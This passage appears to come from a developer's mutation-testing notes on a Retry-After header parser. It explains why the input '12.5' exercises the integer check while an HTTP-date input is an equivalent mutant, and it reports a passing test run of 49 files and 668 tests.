| accept a non-integer `Retry-After` | fails on `'12.5'` |

On that last one: the HTTP-date input is an **equivalent mutant** for removing the integer check, since `parseInt` yields `NaN` and the bound rejects it either way. `'12.5'` is the input that actually carries the assertion, because `parseInt` yields `12` and the bound accepts it. Recorded because the first run appeared to pass and the real cause was that the edit had not applied — the failure mode the macOS side flagged when they found a false positive in their own sweep.

49 files, 668 tests, tsc clean.
